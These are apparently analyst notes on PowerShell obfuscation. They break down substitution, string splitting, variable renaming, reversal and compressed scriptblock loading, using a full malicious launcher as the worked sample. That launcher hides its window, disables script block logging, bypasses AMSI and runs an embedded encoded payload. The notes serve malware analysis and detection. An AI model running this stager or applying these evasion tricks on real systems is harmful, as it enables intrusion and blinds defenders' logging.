# Example:
```
"powershell.exe" -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c $tjtrJ=((''''+''Enabl{3}Sc{''+''2}ipt{1}lo''+''c{4}{0''+''}nv''+''ocation{5}ogg''+''i''+''ng'')-f''I'',''B'',''r'',''e'',''k'',''L'');
$gwcY=((''{''+''3}nabl{2}Sc{''+''1}i''+''pt{0}lockL''+''ogging''+'''')-f''B'',''r'',''e'',''E'');
$jZ5C=((''Sc''+''ript{2}{1}oc{0}L''+''og''+''ging''+'''')-f''k'',''l'',''B'');
$xLV9W=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){$znaT=[Ref].Assembly.GetType(((''{0}''+''{''+''6''+''}''+''stem{9}''+''{4''+''}ana''+''{3''+''}ement{9}{''+''7}''+''{2''+''}''+''t{''+''8}''+''mati{8}n{''+''9}{7}ms''+'
'i''+''{''+''1}t''+''i{5''+''}s'')-f''S'',''U'',''u'',''g'',''M'',''l'',''y'',''A'',''o'',''.''));
$uYi_U=[Ref].Assembly.GetType(((''''+''{3}''+''ystem.{''+''2}a''+''na{0}ement.''+''{''+''1}utomation.{4}''+''ti{5}s'')-f''g'',''A'',''M'',''S'',''U'',''l'')); if ($znaT) {$znaT.GetField(((''am{''+''3''+''}i{0''+''}{2}i{''+''1}''+''Fa''+''i''+''{4''+''}ed'')-f''I'',''t'',''n'',''s'',''l''),''NonPublic,Static'').SetValue($null,$true); };
$ff4Nc=$uYi_U.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($ff4Nc) { $lUh3W=$ff4Nc.GetValue($null); If($lUh3W[$jZ5C]){ $lUh3W[$jZ5C][$gwcY]=0;
$lUh3W[$jZ5C][$tjtrJ]=0; } $xLV9W.Add($gwcY,0); $xLV9W.Add($tjtrJ,0);
$lUh3W[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$jZ5C]=$xLV9W; } Else {[Ref].Assembly.GetType(((''Sy{''+''0}tem.Management''+''.A{''+''4}''+''tomatio''+''n.S''+''c{1}ipt''+''{2}{5}oc{3''+''}'')-f''s'',''r'',''B'',''k'',''u'',''l'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIAH8phmICA7VX+''+''2/iS''+''BL+faX9H6wVEkYhYAPJhZFGOhtsMMG8/MKwaNXYDTS0bW''+''I3ELK7//tV80gyN8nd3EljCcXu{2}''+''qqu/uq{2}Rxa7OGAki{1}VWDY{1}/f/1FuDwDlKJIEHPR4zosCjkajNe48LYNCx''+''vhqyBOle22mUSIxLMvXxq7NMUxO3+XWpgpWYajOSU4EwvCX4K3wim+7c/XOGDCn0Luj1KLJnNEL2LHBgpWWLhV4pDvdZMAcc9K1pYSJuZ//z1fmN7Ks5L2t''+''EM0E/PWMWM4KoWU5gvC3wV+oH3cYjFvkiBNsmTBSh6Jq5WSE2dogXtgbY9NzFZJmOXhLm+3STHbpfHpUtzKWUbMw+sgT{1}IlDFOcZfmiMOX2p7PZP8Xp5fDRLmYkwiUjZjhNthZO9yTAWamN4pDiEV7M{1}MtiK''+''YmXs0IBxPbJBou5eEdpUfhfzIg9fLhC96NK4nslkBqwtFCEmH5/TTMJdxSfFfMf+Hmi{1}{1}GeVyoAfn9zCBdX/hx{2}Dx/w523h+kxPOxhcFgdJRk66XwWpKJhwOmJJeoTPnJ3ucGH2C{2}i{1}e+paD8UftSZfVbmiBwtTNyHh7E39m+jnNu3I0bnU52Ru4gWJcfMYo4gEV76KHwUFLyg+IVK6ivXA{1}TF/2cBhE1O8RIzjzLnxnZoWEfaqq+4IDXGqBBDYDLyCmBe+deYcOjFvxCaOAL3zN5A1t4AswVfpS2Yc{2}6fzbxDKNyjKsq''+''Iw2''+''EGaBkXBwo''+''hiSHglzshl''+''S9mx5PSaf3PX3FFGApSxq7lZ4d/xvJzbSOKMpbsAAgsY2NYWBwRRDklRaJM{1}q0eLLK/n5z8EpIEohfwBS3sICKxwI''+''CzG6ZLy''+''2sSpUShZmBnRluIIZE51{1}6doCVXikiUnfqElDvOfeXpNhzP3OTZXUN75C{1}G3aMKKgktSBmWI4/zk/V9OfF9+zt40UnyJj3hNsql6ZDwNcoc/As7TC0YnRFIGaOhpEqkow/e1c60Rfyv3yUCBx2+2{2}YnBLBN+TSOmRDYcUjUSc/EwYFISmUEjG7T0B4UclofgoacEYSfEdcutMUszWGOgtIdEUmu{2}{1}JVseHcMZ{2}{1}M5htK214FVBo022XLzyRyaHvc1tlGUKu1x5JS{2}db6VWkD6PlEXm6UsBeRw3MX3qGo9{2}uqkamS{1}bVOYzT3''+''Kv{2}Eo+1yTV8tvCSz7v1muVyuh6h1R0NFTcIK3SF3lNjtIFLLZdcMme3IPdu5ISq/p+3V75H3nPnWg9xdK8vHFh363vAfhtYbupY6cI7Kc899eBm/aMt5i6YTS+35n{2}m0ZXPpNTbL4Vg9zFvueOJ1umg83PfWCtjRdqbtLB81Z{2}iab''+''HYbaoY8Rg0tpH6F7R8t1ZuMOy/Iq++6Lx{2}IG0vwg4AflH+PbE3qN1Tb9ya{2}INpwmxLYVFBz62G0KMtuz0ZLuENlFWhDRblvmvwu+1579D{1}nMnK1iWl5juw2w8R+M''+''Wp''+''zV++F1dVkSOnBch5qvbW+Np1R14xHVcudDLDuRqEUbnxvFA83YXUU1dlkPdLnY/Mw15gauuEBNzcVX5{2}0{2}aZTHWnUMt3tnbPZtvs6bVhxZ41sN5vTVTNw6m''+''vf0425I79MKqNFKD0bOA4Zcphstfxnx6HSpO3e2c7dMJTqkblxj67baZgVeTe3fcmu9Iy52xmNWndqb6wd7a{2}aVH{1''+''}1cWvR4nlfdkkwsZGiHO+NEY/j2JEnyb3s7Po{1}Wxolj+MKUcyDohCsPqm6+tSG/dBBeAW6p7jDd3fo+xjkgZuy3iKGBvJIsw893CzLTl1+wasO5wbaqInCkW0tFUVTFMDb3+oDWq57YKffuZPDRGnAvt7zkP{2}oEdwty/5YCc2b{2}npoN7n9O3fdHN+sUiBl2b{1}V4IV/gHiffkp''+''3v2xbySN6RO5+Ui3L9qG1UJ6UmxtVVues{2}VU7e7RU7XLd+fob5PTUITG{2}Vma59O7Z4c3v119yq9G9+S61P+vtJkqzFaK{1}8tC1{2}8''+''VXT1L90oY''+''HCeEaosjHu{1}1OY0xhAIIR6VqwFEqTgE8BvF/DAHIeC/iU4hgnpz56Kwivgo''+''W36eC69OXLBHyEGgjVqdTF8ZKtitJzVZKgqUvPUu1U6378Yo1kexS5''+''{2}SKfCk7AXGzTk20wRxaCKP50qGD2Y9CCPgX{2}M9zg5A30C+hg5yLO0VOThL7H7nKtVya8gw4wk+HiUz71nRgCBm7xk5BjfCZ6P2PlsPZTKXPpRCv4E/4Xy{2}yt/YfdH6KRVDxj893yt''+''wvvuvjPA8BDhIGgBR2V4vOc9yEOlyx5F16s{1}{1}osLg//36e/Y7c9mKZPHf1f580shnUNAAA{0}'')-f''='',''Q'',''r'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
```
# Substitution:
Using Substitution to break up the code making it harder to read or pattern match. 
```
$gwcY=((''{''+''3}nabl{2}Sc{''+''1}i''+''pt{0}lockL''+''ogging''+'''')-f''B'',''r'',''e'',''E''); 
```
```
''B'',''r'',''e'',''E''
  0     1     2     3
$gwcY=EnableScriptBlockLogging
```

# Splitting
Adding white space (concatenation) that is removed when the code it ran. This won't affect its ability to run but will make it harder to read or pattern match. 
```
''+''
```
***Note:*** this is just a concatenation and can be removed when reversing 


# Variables
Use variables to break up the code making it harder to read or pattern match
```
$nTlW = New-Object Microsoft.CSharp.CSharpCodeProvider
$cUj0x = New-Object System.CodeDom.Compiler.CompilerParameters
$cUj0x.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$cUj0x.GenerateInMemory = $True
$zgA = $nTlW.CompileAssemblyFromSource($cUj0x, $dn)
```

# Reverse a String:
## Non Regex
```
$string = "This is a test, hope it works!"
$arr = $string -split ""
[array]::Reverse($arr)
$arr -join ''
```
```
$str = "This is a test, hope it works!"
$str[-1..-($str.length)] -join ""
```
```
$str = “This is a test, hope it works!” -join (($str.length-1)..0 | Foreach-Object { $str[$_] })
```
```
“This is a test, hope it works!” -split “” | ForEach-Object -Begin {$a = @()} -Process {$a = $_ + $a} -End {$a}
```
## Regex
```
$String = "This is a test, hope it works!"
([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
```

## Other
```
$PTR = “100.1.1.10.in-addr.arpa”
$t = $PTR -replace ‘.in-addr.arpa$’ -split ‘.’
$IP = $t[-1..-($t.Count)] -join ‘.’
$IP
```
##### Response
```
10.1.1.100
```
## ScriptBlock
```
&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object
System.IO.Compression.GzipStream((New-Object
System.IO.MemoryStream(,[System.Convert]::FromBase64String(...),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
```
1. [scriptblock]::create - create an object representing a pre-compiled block of powershell script New-Object System.IO.StreamReader - read file data
2. New-Object System.IO.Compression.GzipStream - decompress byte array
3. New-Object System.IO.MemoryStream(, - Passing an array of bytes to system.IO.MemoryStream (the coma following the paraenthesis is important) https://scriptingetc.wordpress.com/2019/05/22/passing-an-array-of-bytes-to-system-io-memorystream/
4. [System.Convert]::FromBase64String - which converts a base64-encoded string to a byte array






# Powershell notes:
1. NoE – NoExit: Doesn’t exit after running the command, i.e. creates a process and stays running as powershell.exe
2. NoP – NoProfile: Doesn’t load the PowerShell profile
3. NonI – NonInteractive: Doesn’t create an interactive prompt, i.e. it runs the command without the PowerShell window popping up a persistent terminal on the user’s screen
4. ExecutionPolicy Bypass: Bypasses the execution policy if it is set (self-explanatory)
5. C – Command: What to run (again, pretty self-explanatory)
6. Set-Alias cmdlet - sal: creates a shortcut ‘a’ for New-Object







# Resoures:
1. https://www.huntress.com/blog/from-powershell-to-payload-an-analysis-of-weaponized-malware
2. https://github.com/danielbohannon/Invoke-Obfuscation
3. https://github.com/danielbohannon/Revoke-Obfuscation
4. https://github.com/danielbohannon/Invoke-CradleCrafter
5. https://github.com/JoelGMSec/Invoke-Stealth
6. https://github.com/GhostPack/Invoke-Evasion
7. https://github.com/tokyoneon/Chimera
8. https://github.com/klezVirus/chameleon
9. https://github.com/vysecurity/ps1-toolkit
10. https://github.com/CBHue/PyFuscation
11. https://github.com/Mr-Un1k0d3r/Base64-Obfuscator
